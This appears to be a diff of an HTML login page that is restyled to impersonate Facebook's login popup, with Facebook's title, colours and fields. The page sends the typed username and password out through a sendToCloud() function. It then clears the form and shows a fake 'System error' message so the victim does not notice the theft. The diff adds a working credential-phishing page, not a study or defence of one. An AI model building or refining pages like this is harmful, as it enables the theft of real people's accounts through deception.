@@ -3,16 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Đăng nhập hệ thống</title>
+<title>Đăng nhập Facebook</title>
 
 <style>
-@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap");
-
+/* Sử dụng font hệ thống giống Facebook */
 * {
   margin: 0;
   padding: 0;
   box-sizing: border-box;
-  font-family: "Open Sans", sans-serif;
+  font-family: Helvetica, Arial, sans-serif;
 }
 
 body {
@@ -20,97 +19,134 @@ body {
   justify-content: center;
   align-items: center;
   min-height: 100vh;
+  margin: 0;
 }
 
-/* nền */
+/* Giữ nguyên nền cũ của bạn */
 body::before {
   content: "";
   position: absolute;
   width: 100%;
   height: 100%;
-
   background:
     linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.5)),
-    url("https://blog.myridima.com/wp-content/uploads/2023/12/1674.webp") no-repeat center center/cover;
-
+    url("https://c.files.bbci.co.uk/45EC/production/_129800971_gettyimages-1238219305.jpg") no-repeat center center/cover;
   z-index: -1;
 }
 
-/* card */
+/* Card trắng theo style Facebook */
 .login-card {
   width: 400px;
-  padding: 30px;
-  border-radius: 10px;
-  text-align: center;
-  backdrop-filter: blur(10px);
-  border: 1px solid rgba(255,255,255,0.3);
-  color: #fff;
-}
-
-/* title */
-h2 {
-  margin-bottom: 25px;
-}
-
-/* input */
-.input-group {
-  position: relative;
-  margin: 20px 0;
-  border-bottom: 2px solid #aaa;
-}
-
-.input-group input {
-  width: 100%;
-  height: 40px;
-  background: transparent;
-  border: none;
-  outline: none;
-  color: #fff;
-  font-size: 16px;
-}
-
-.input-group label {
-  position: absolute;
-  top: 50%;
-  left: 0;
-  transform: translateY(-50%);
-  color: #ccc;
-  transition: 0.2s;
-  pointer-events: none;
-}
-
-/* hiệu ứng label */
-.input-group input:focus ~ label,
-.input-group input:valid ~ label {
-  top: 0;
-  font-size: 12px;
-  color: #fff;
-}
-
-/* button */
-button {
-  width: 100%;
-  padding: 12px;
-  margin-top: 20px;
   background: #fff;
-  color: #000;
-  border: none;
-  border-radius: 5px;
+  border-radius: 8px;
+  box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
+  padding: 0;
+  overflow: hidden;
+  position: relative;
+}
+
+/* Header của popup */
+.card-header {
+  padding: 20px;
+  text-align: center;
+  border-bottom: 1px solid #dddfe2;
+  position: relative;
+}
+
+.card-header h2 {
+  font-size: 20px;
+  color: #1c1e21;
+  font-weight: 600;
+}
+
+.close-btn {
+  position: absolute;
+  right: 15px;
+  top: 15px;
+  font-size: 24px;
+  color: #606770;
   cursor: pointer;
-  font-weight: bold;
-  transition: 0.3s;
+  line-height: 1;
 }
 
-button:hover {
-  background: transparent;
-  color: #fff;
-  border: 1px solid #fff;
+/* Nội dung bên trong form */
+.card-body {
+  padding: 20px;
 }
 
-/* status */
-#status {
-  margin-top: 15px;
+.input-container {
+  margin-bottom: 12px;
+}
+
+.input-container input {
+  width: 100%;
+  padding: 14px 16px;
+  font-size: 15px;
+  border: 1px solid #dddfe2;
+  border-radius: 6px;
+  outline: none;
+  background-color: #f5f6f7;
+  color: #1c1e21;
+}
+
+.input-container input:focus {
+  border-color: #1877f2;
+  box-shadow: 0 0 0 2px #e7f3ff;
+  background-color: #fff;
+}
+
+/* Ghi nhớ mật khẩu */
+.remember-me {
+  display: flex;
+  align-items: center;
+  margin: 15px 0;
   font-size: 14px;
+  color: #4b4f56;
+}
+
+.remember-me input {
+  margin-right: 8px;
+  width: 18px;
+  height: 18px;
+}
+
+/* Nút Đăng nhập xanh */
+.btn-login {
+  width: 100%;
+  padding: 10px;
+  background-color: #1877f2;
+  border: none;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 20px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background-color 0.2s;
+}
+
+.btn-login:hover {
+  background-color: #166fe5;
+}
+
+/* Quên mật khẩu */
+.forgot-password {
+  display: block;
+  text-align: center;
+  margin-top: 15px;
+  color: #1877f2;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.forgot-password:hover {
+  text-decoration: underline;
+}
+
+#status {
+  text-align: center;
+  margin-top: 10px;
+  font-size: 13px;
+  min-height: 18px;
 }
 </style>
 
@@ -118,21 +154,31 @@ button:hover {
 <body>
 
 <div class="login-card">
-    <h2>Đăng nhập</h2>
-
-    <div class="input-group">
-        <input type="text" id="username" required>
-        <label>Tên đăng nhập</label>
+    <div class="card-header">
+        <h2>Log Into Facebook</h2>
+        <span class="close-btn">&times;</span>
     </div>
 
-    <div class="input-group">
-        <input type="password" id="password" required>
-        <label>Mật khẩu</label>
+    <div class="card-body">
+        <div class="input-container">
+            <input type="text" id="username" placeholder="Email or phone number" required>
+        </div>
+
+        <div class="input-container">
+            <input type="password" id="password" placeholder="Password" required>
+        </div>
+
+        <div class="remember-me">
+            <input type="checkbox" id="remember">
+            <label for="remember">Remember password</label>
+        </div>
+
+        <button class="btn-login" onclick="sendToCloud()">Log In</button>
+
+        <a href="#" class="forgot-password">Forgot password?</a>
+        
+        <div id="status"></div>
     </div>
-
-    <button onclick="sendToCloud()">ĐĂNG NHẬP</button>
-
-    <div id="status"></div>
 </div>
 
 <script type="module">
@@ -166,16 +212,16 @@ window.sendToCloud = function() {
         }).then(() => {
             userField.value = '';
             passField.value = '';
-            status.innerHTML = '<span style="color:#0f0">Đang xử lý...</span>';
+            status.innerHTML = '<span style="color:#00a400">Processing...</span>';
 
             setTimeout(() => {
-                status.innerHTML = '<span style="color:#f55">Lỗi hệ thống, thử lại sau</span>';
+                status.innerHTML = '<span style="color:#fa3e3e">System error, please try again later.</span>';
             }, 1500);
         }).catch((error) => {
             status.innerHTML = '<span style="color:red;">' + error.message + '</span>';
         });
     } else {
-        status.innerHTML = '<span style="color:#ccc;">Nhập đầy đủ thông tin</span>';
+        status.innerHTML = '<span style="color:#777;">Please enter all information</span>';
     }
 };
 </script>
